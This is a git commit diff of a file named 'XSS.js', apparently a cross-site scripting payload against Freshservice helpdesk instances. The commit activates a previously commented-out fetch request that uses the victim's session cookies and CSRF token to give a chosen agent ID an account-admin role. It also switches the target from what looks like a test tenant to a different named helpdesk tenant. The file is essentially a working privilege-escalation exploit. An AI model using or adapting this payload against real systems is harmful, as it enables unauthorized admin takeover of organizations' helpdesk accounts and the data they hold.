a4fcc49141bd843559f276cc19312bae145a49e0
sureela <42230835+sureela@users.noreply.github.com>
2025-02-06 20:54:48 +0530

    Update XSS.js
    account admin

--- XSS.js
+++ XSS.js
@@ -14,18 +14,18 @@ async function sendRequests() {
             body: '_method=put'
         });
 
-        // // Execute PUT request that convert Agent ==> account admin
-        // await fetch('https://h1-h00.freshservice.com/api/_/agents/59000349414/map_workspace_groups_and_roles', {
-        //     method: 'PUT',
-        //     credentials: 'include',
-        //     headers: {
-        //         'Content-Type': 'application/json',
-        //         'X-Csrf-Token': csrfToken
-        //     },
-        //     body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000089955,"assignment_scope":"entire_helpdesk"},{"role_id":59000089956,"assignment_scope":"entire_helpdesk"},{"role_id":59000089957,"assignment_scope":"entire_helpdesk"},{"role_id":59000089958,"assignment_scope":"entire_helpdesk"},{"role_id":59000089959,"assignment_scope":"entire_helpdesk"},{"role_id":59000089960,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
-        // });
+        // Execute PUT request that convert Agent ==> account admin
+        await fetch('https://fsbhelpdesk.freshservice.com/api/_/agents/56000627108/map_workspace_groups_and_roles', {
+            method: 'PUT',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Csrf-Token': csrfToken
+            },
+            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":56000105052,"assignment_scope":"entire_helpdesk"}],"workspace_id":1}`
+        });
 
-        // console.log('Requests completed successfully');
+        console.log('Requests completed successfully');
     } catch (error) {
         console.error('Error:', error);
     }
